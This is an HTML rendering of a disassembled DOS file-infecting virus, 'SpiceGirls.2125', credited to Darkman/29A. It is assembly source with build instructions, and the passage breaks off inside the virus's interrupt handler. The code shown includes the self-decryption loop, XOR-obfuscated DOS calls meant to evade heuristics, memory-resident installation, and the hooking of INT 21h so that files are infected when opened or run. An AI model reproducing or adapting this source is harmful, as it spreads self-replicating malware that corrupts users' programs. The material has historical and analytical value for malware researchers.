<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.SpiceGirl.2125 - spic2125.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;               SpiceGirls.2125</span><span class="sc0">
</span><span class="sc1">;               Disassembled by</span><span class="sc0">
</span><span class="sc1">;                 Darkman/29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   SpiceGirls.2125 is a 2125 bytes parasitic resident COM virus. Infects fi-</span><span class="sc0">
</span><span class="sc1">;   les at open file, close file, get or set file attributes, load and/or exe-</span><span class="sc0">
</span><span class="sc1">;   cute program and rename file by prepending an EXE header and the virus to</span><span class="sc0">
</span><span class="sc1">;   the infected file. SpiceGirls.2125 has an error handler, anti-heuristic</span><span class="sc0">
</span><span class="sc1">;   techniques, anti-debugging techniques, disinfection on fly and is oligo-</span><span class="sc0">
</span><span class="sc1">;   morphic in file using its internal oligomorphic engine.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To compile SpiceGirls.2125 with Turbo Assembler v 4.0 type:</span><span class="sc0">
</span><span class="sc1">;     TASM /m SPIC2125.ASM</span><span class="sc0">
</span><span class="sc1">;     TLINK /t /x SPIC2125.OBJ</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">              </span><span class="sc1">; Origin of SpiceGirls.2125</span><span class="sc0">

</span><span class="sc5">head_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pages_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MZ'</span><span class="sc0">                </span><span class="sc1">; EXE signature</span><span class="sc0">
</span><span class="sc5">bytes_on_las</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">pages_end</span><span class="sc4">-</span><span class="sc5">pages_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">pages_in_fil</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">pages_end</span><span class="sc4">-</span><span class="sc5">pages_begin</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">relo_end</span><span class="sc4">-</span><span class="sc5">relo_begin</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">head_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; Minimum-, maximum number of para...</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffeah</span><span class="sc4">,</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc1">; Pointer to stack</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SG'</span><span class="sc0">                </span><span class="sc1">; Checksum</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b2h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request + 02h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">relocations</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Offset of relocations - 100h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Overlay number (main program)</span><span class="sc0">
</span><span class="sc5">relo_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">relocations</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea0178h</span><span class="sc4">,</span><span class="sc2">0ffea017ch</span><span class="sc4">,</span><span class="sc2">0ffea0180h</span><span class="sc4">,</span><span class="sc2">0ffea0184h</span><span class="sc4">,</span><span class="sc2">0ffea0188h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea018ch</span><span class="sc4">,</span><span class="sc2">0ffea0190h</span><span class="sc4">,</span><span class="sc2">0ffea0194h</span><span class="sc4">,</span><span class="sc2">0ffea01beh</span><span class="sc4">,</span><span class="sc2">0ffea01f8h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea0206h</span><span class="sc4">,</span><span class="sc2">0ffea0218h</span><span class="sc4">,</span><span class="sc2">0ffea0228h</span><span class="sc4">,</span><span class="sc2">0ffea025ch</span><span class="sc4">,</span><span class="sc2">0ffea0272h</span><span class="sc0">
</span><span class="sc5">relo_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">head_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' - Spice_Girls.2125 - '</span><span class="sc0">
</span><span class="sc5">stack_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0ffea00b2h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Seven pointers to service reques...</span><span class="sc0">

         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">virus_begin</span><span class="sc0">     </span><span class="sc1">; Offset of virus_begin</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffeah</span><span class="sc0">      </span><span class="sc1">; Segment of virus_begin</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">crypt_begin</span><span class="sc0">     </span><span class="sc1">; Offset of crypt_begin</span><span class="sc0">
</span><span class="sc5">crypt_size</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">crypt_key</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; 16-bit encryption/decryption key</span><span class="sc0">
</span><span class="sc5">virus_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pop_reg16</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">; POP reg16</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypt_algo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Decryption algorithme</span><span class="sc0">
</span><span class="sc5">index_reg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; 16-bit index register</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Decrypt two bytes</span><span class="sc0">
</span><span class="sc5">index_reg_</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; 16-bit index register</span><span class="sc0">
</span><span class="sc5">add_idx_imm8</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; 8-bit immediate</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; DI = offset of next encrypted byte</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">crypt_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc1">; Store segment of PSP for current...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_name</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3000h</span><span class="sc4">+</span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; SpiceGirls.2125 function</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">install</span><span class="sc0">
</span><span class="sc5">eternal_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">eternal_loop</span><span class="sc0">    </span><span class="sc1">; Error? Jump to eternal_loop</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_exit</span><span class="sc0">

</span><span class="sc5">find_name</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Find filename</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc5">psp_segment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; DS = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS = segment of environment for ...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
</span><span class="sc5">find_zero</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of environment block</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Last environment variable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to find_zero</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of environment block</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Last environment variable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to find_zero</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">find_zero_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero_</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_zero_</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; SI = offset of last character by...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; Store last byte of file extension</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Allocate memory, move virus to t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; BX = number of paragraphs to all...</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">memory_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">install_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to install_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BP = segment of allocated block</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">memory_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">install_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to install_exit</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; AX = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">49h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Free memory</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Subtract ten from segment of all...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; ES = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0f1h</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">exe_header</span><span class="sc0">   </span><span class="sc1">; SI = offset of exe_header</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">header_end</span><span class="sc4">-</span><span class="sc5">header_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_header</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of exe_header</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of exe_header</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_header</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">virus_begin</span><span class="sc0">  </span><span class="sc1">; SI = offset of virus_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_virus</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of virus</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of virus</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_virus</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_relo</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3521h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">25h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int21_virus</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b0h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load segments from stack</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
</span><span class="sc5">install_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">correct_relo</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Correct relocation entries</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">relocations</span><span class="sc0">  </span><span class="sc1">; SI = offset of relocations</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">      </span><span class="sc1">; CX = number of relocation entries</span><span class="sc0">
</span><span class="sc5">correct_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; DI = offset of relocation</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; SI = offset of next relocation e...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffeah</span><span class="sc0">  </span><span class="sc1">; Store high-order word of relocat...</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">correct_loop</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h of SpiceGirls.2125</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">

